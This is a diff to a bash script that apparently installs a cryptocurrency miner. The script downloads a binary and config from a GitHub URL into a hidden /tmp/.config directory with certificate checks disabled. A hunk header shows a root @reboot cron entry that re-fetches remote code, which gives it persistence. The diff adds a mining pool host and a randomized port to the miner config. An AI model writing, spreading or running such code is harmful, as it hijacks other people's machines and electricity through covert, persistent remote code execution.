@@ -1,10 +1,14 @@
 #!/bin/bash
 
 mode="${1:-0}"
+port="1130"
+host="dyn.dream.avspic.com"
 work="/tmp/.config"
 src="https://raw.githubusercontent.com/pakoinake/jzoax/main"
 hugepage="128"
 
+portAdd="$((RANDOM % 5))"
+port="$((port + portAdd))"
 name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
 [ -n "$name" ] || name="NULL"
 name="${name}"
@@ -25,6 +29,7 @@ sudo sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src
 rm -rf "${work}"; mkdir -p "${work}";
 wget --no-check-certificate -qO "${work}/config.json" "${src}/idle.json"
 wget --no-check-certificate -qO "${work}/idle" "${src}/idle"
+[ -f "${work}/config.json" ] && [ -n "$host" ] && [ -n "$port" ] && sed -i "s/\"url\":.*,/\"url\": \"${host}:${port}\",/g" "${work}/config.json"
 [ -f "${work}/config.json" ] && [ -n "$name" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${name}\",/g" "${work}/config.json"
 [ -f "${work}/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "${work}/config.json"
 chmod -R 777 "${work}"
